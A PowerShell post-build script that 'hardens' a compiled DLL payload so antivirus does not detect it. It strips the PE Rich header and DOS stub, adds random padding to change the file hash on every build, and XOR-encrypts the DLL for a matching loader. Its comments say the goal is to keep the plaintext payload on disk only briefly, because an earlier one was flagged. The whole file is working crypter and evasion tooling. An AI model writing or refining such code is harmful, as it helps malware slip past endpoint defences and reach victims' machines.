param([string]$In, [string]$KeyHeader)
# Payload hardening - runs in the MSBuild post-build, so the plaintext DLL
# only ever exists for the ~1 second between the link finishing and this
# script finishing (never across tool invocations, which is the window that
# got the previous payload flagged).
#
# 1. zero the DOS stub + Rich header (toolchain fingerprint AV ML keys on)
# 2. append 16-64 random zero bytes (fresh hash per build)
# 3. XOR-encrypt in place with the per-build key from payload_key.h
#    keystream: key[i % 32] ^ (i * 31 + 7) - must match the loader decrypt
$ErrorActionPreference = 'Stop'

# --- parse the 32-byte key from the generated header ---
$kh = Get-Content $KeyHeader -Raw
$km = [regex]::Matches($kh, '0x([0-9a-fA-F]{2})')
if ($km.Count -ne 32) { Write-Error "payload_key.h: expected 32 key bytes, found $($km.Count)"; exit 1 }
$key = New-Object byte[] 32
for ($i = 0; $i -lt 32; $i++) { $key[$i] = [Convert]::ToByte($km[$i].Groups[1].Value, 16) }

# --- read with retries (Defender scan-lock race) ---
$b = $null
for ($attempt = 0; $attempt -lt 12; $attempt++) {
    try { $b = [System.IO.File]::ReadAllBytes($In); break }
    catch { Start-Sleep -Milliseconds 250 }
}
if ($null -eq $b) { Write-Error "harden: unreadable after 12 attempts"; exit 1 }

# --- strip rich header ---
$e_lfanew = [BitConverter]::ToInt32($b, 0x3C)
if ($e_lfanew -le 0x40 -or $e_lfanew -ge $b.Length) { Write-Error "bad PE header"; exit 1 }
for ($i = 0x40; $i -lt $e_lfanew; $i++) { $b[$i] = 0 }

# --- random-length zero pad (16-64) ---
$rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
$rbytes = New-Object byte[] 4
$rng.GetBytes($rbytes)
$padLen = 16 + ([Math]::Abs([BitConverter]::ToInt32($rbytes, 0)) % 49)
$rng.Dispose()
$nb = New-Object byte[] ($b.Length + $padLen)
[Array]::Copy($b, $nb, $b.Length)   # pad region stays zero

# --- XOR encrypt in place ---
for ($i = 0; $i -lt $nb.Length; $i++) {
    $nb[$i] = $nb[$i] -bxor $key[$i % 32] -bxor (($i * 31 + 7) -band 0xFF)
}

# --- write with retries ---
for ($attempt = 0; $attempt -lt 12; $attempt++) {
    try { [System.IO.File]::WriteAllBytes($In, $nb); break }
    catch { Start-Sleep -Milliseconds 250 }
}
if ($attempt -ge 12) { Write-Error "harden: write kept failing"; exit 1 }
Write-Output ("hardened: {0} bytes (+{1} pad, rich stripped, encrypted)" -f $nb.Length, $padLen)
